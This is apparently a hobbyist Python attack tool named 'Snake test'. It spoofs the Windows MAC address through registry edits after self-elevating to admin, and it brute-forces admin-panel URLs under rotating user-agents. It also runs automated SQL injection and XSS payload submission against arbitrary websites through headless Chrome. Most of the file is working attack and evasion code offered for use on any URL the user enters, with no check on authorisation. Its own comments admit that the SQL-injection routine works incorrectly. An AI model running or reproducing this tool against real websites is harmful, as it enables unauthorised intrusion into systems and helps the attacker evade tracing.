import requests as rq 
import time
import subprocess
import random
import re
import ctypes
import sys

from colorama import Fore, init
from fake_useragent import UserAgent

from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys

from config import ROOT_URL, SQL_PAYLOADS

init(autoreset=True)

green_list = []
run = True
enter = Fore.GREEN + '-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n'

print(Fore.GREEN + 
        '''
        _______               __            __                __   
        |     __|.-----.---.-.|  |--.-----. |  |_.-----.-----.|  |_ 
        |__     ||     |  _  ||    <|  -__| |   _|  -__|__ --||   _|
        |_______||__|__|___._||__|__|_____| |____|_____|_____||____|
                                                                            
        ''')

def menu():
    """MENU"""
    print(Fore.RED +
        'SNAKE COMMAND\n',
        enter,
        Fore.BLUE + f'-rma : random MAC adress for this session{Fore.RED} (need super-user)\n',
        enter,
        Fore.BLUE + f'-sau (url) : search admin url\n',
        enter,
        Fore.BLUE + f'-xss : js xss attack, -c (custom script){Fore.RED} (need chrome)\n',
        enter,
        Fore.BLUE + f'-inject : sql inject test{Fore.RED} (need chrome)\n',
        enter,
        Fore.BLUE + f'-menu : this menu\n',
        enter,
        Fore.BLUE + f'-close : close snake test\n',
        enter
        )

def run_as_admin():
    """START OF ADMINISTRATOR"""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

"""FUNC FOR SET MAC ADRESS"""
def generate_random_mac():
    mac = [
        random.randint(0x00, 0xFF) & 0xFE,
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF)
    ]
    return ":".join(f"{byte:02x}" for byte in mac)

def get_network_adapters():
    """GET ALL NETWORK ADAPTERS IN YOUR PC"""
    try:
        result = subprocess.run("netsh interface show interface", shell=True, capture_output=True, text=True)
        adapters = re.findall(r"\s{2}Enabled\s{2}(.*?)\s", result.stdout)
        return [adapter.strip() for adapter in adapters]
    except Exception as e:
        print(Fore.RED + f'Error: {e}')
        print(enter)

def change_mac_address(adapter_name):
    """CHANGE MAC IN SELECT ADAPTER"""
    new_mac = generate_random_mac()
    try:
        subprocess.run(
            f'netsh interface set interface "{adapter_name}" disable',
            shell=True, check=True
        )

        registry_key = f"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001"
        subprocess.run(
            f'reg add "{registry_key}" /v NetworkAddress /d {new_mac.replace(":", "")} /f',
            shell=True, check=True
        )

        subprocess.run(
            f'netsh interface set interface "{adapter_name}" enable',
            shell=True, check=True
        )

        print(Fore.GREEN + f"MAC adress changed: '{adapter_name}' MAC: {new_mac}")

    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error for: '{adapter_name}': {e}")
        print(enter)

def start_set_adapter():
    """SELECT WI:FI ADAPTER TO SET MAC"""
    adapters = get_network_adapters()
    try:
        if not adapters:
            print(Fore.RED + f"Error no wifi adapter")
            return

        print(Fore.GREEN + f"Adapters")
        for idx, adapter in enumerate(adapters):
            print(f"{idx + 1}. {adapter}")

        choice = int(input(Fore.BLUE+ f"Enter number adapter: ")) - 1
        if 0 <= choice < len(adapters):
            change_mac_address(adapters[choice])
        else:
            print(Fore.RED + f"No correct")

            print(Fore.GREEN + f"Adapters")

            for idx, adapter in enumerate(adapters):
                print(f"{idx + 1}. {adapter}")

            choice = int(input(Fore.BLUE + f"Enter number adapter: ")) - 1
            if 0 <= choice < len(adapters):
                change_mac_address(adapters[choice])

    except Exception as e:
        print(Fore.RED + f'Error: {e}')
        print(enter)

"""!!!WORK UNCORRECT!!!"""
def test_sql_injection(url):
    """SQL INJECT TO ALL |input| ELEMENT (custom sql cod in config.py : SQL_PAYLOADS)"""
    options = Options()
    options.add_argument("--headless")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)

    driver.get(url)
    
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_all_elements_located((By.TAG_NAME, "input")))
        while True:
            inputs = driver.find_elements(By.TAG_NAME, "input")
            
            if not inputs:
                break

            for i, input_field in enumerate(inputs):
                for payload in SQL_PAYLOADS:
                    try:
                        input_field.clear()
                        input_field.send_keys(payload)
                        input_field.send_keys(Keys.RETURN) 
                        
                        WebDriverWait(driver, 3).until(EC.staleness_of(input_field))

                        if "error" in driver.page_source.lower() or "syntax" in driver.page_source.lower():
                            print(Fore.GREEN + f"\nHave sql inject {i} injected: {payload}")
                            break
                        else:
                            print(Fore.BLUE + f"{i} No sql inject: {payload}                  ", end='\r')

                    except Exception as e:
                        print(Fore.RED + f"Error injecting{i}                   ", end='\r')
    except Exception as e:
        print(Fore.RED + f"\nError: {e}")
    finally:
        print(enter)
        driver.quit()

def check_xss(url, script=None):
    """TEST XSS ATACK TO ALL |input| ELEMENT(AND CUSTOM SCRIPT INPUT IF FLAG : -c (custom script))"""
    options = Options()
    options.add_argument("--headless")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)

    try:
        driver.get(url)
        
        input_field = driver.find_element(By.TAG_NAME, "input")

        if script is None:
            payload = "<script>alert('oops');</script>" #default script for xss (if you don t write your script : -c)
        else:
            payload = script #if you write your script

        input_field.send_keys(payload)
        
        input_field.submit()
        time.sleep(2) 
        
        logs = driver.get_log("browser")
        for entry in logs:
            if "alert" in entry["message"]:
                return print(Fore.GREEN + f"XSS Succeful: {payload}")
        return print(Fore.RED + "XSS False")
        
    except Exception as e:
        return print(Fore.RED + f"Error: {e}")
        
    finally:
        print(enter)
        driver.quit()

def create_ua():
    """RANDOM USER-AGENT"""
    ua = UserAgent()
    user_agent = {'user-agent': ua.random}
    return user_agent

def search_admin_url(url: str) -> bool:
        """SEARCH ADMIN(URL) custom url in config.py : ROOT_URL"""
        try:
            for i in ROOT_URL:
                user_agent = create_ua() #random user-agent

                p = 0
                print(Fore.BLUE + f'Process: {Fore.RED}{i}         ', end='\r') 

                response = rq.get(f'{url + i}', headers=user_agent)

                if response.status_code <= 300:
                    green_list.append(i)

            if green_list == []:
                print(Fore.BLUE + '\nNot found :(')
                print(enter)
                return False
            else:
                for el in green_list:
                    print(Fore.GREEN + f'\nSucceful: {Fore.BLUE}{url}{Fore.GREEN}{el}')
                print(enter)
        except Exception as e:
            print(Fore.RED + f'Error: {e}')
            print("\n" + enter)

if __name__=='__main__':
    menu()
    while run:
        command = input(Fore.BLUE + '---> ').lower()

        if command == '-inject':
            url_sql = input(Fore.BLUE + 'Enter a url: ').lower()
            test_sql_injection(url_sql)

        elif command == '-rma':
            run_as_admin()
            start_set_adapter()

        elif '-sau' in command:
            if 'https' or '//' in command:
                url = command[4:]
                search_admin_url(url)
        
        elif '-xss' in command:
            url_xss = input(Fore.BLUE + 'Enter a url: ').lower()

            if '-c' in command:
                script = command.split('-c')[1]
                check_xss(url_xss, script=script)
            else:
                check_xss(url_xss)

        elif command == '-menu':
            menu()

        elif command == '-close':
            run = False

        else:
            print(Fore.RED + 'Snake dont have this command!\n-menu to check command')
            print(enter)